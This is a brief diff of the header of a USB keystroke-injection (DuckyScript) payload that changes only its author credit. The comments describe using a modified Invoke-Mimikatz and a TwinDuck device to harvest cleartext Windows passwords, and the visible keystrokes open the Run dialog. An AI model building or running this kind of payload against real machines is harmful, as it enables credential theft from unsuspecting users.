@@ -1,5 +1,5 @@
 REM Invoke-Mimiduck-REMOTE
-REM Created by secwolf6 using a modified version of Invoke-Mimikatz and a TwinDuck
+REM Created by secw01f using a modified version of Invoke-Mimikatz and a TwinDuck
 REM Pulls cleartext passwords with Invoke-Mimikatz and saves output to txt file on the TwinDuck
 DELAY 1000
 GUI r
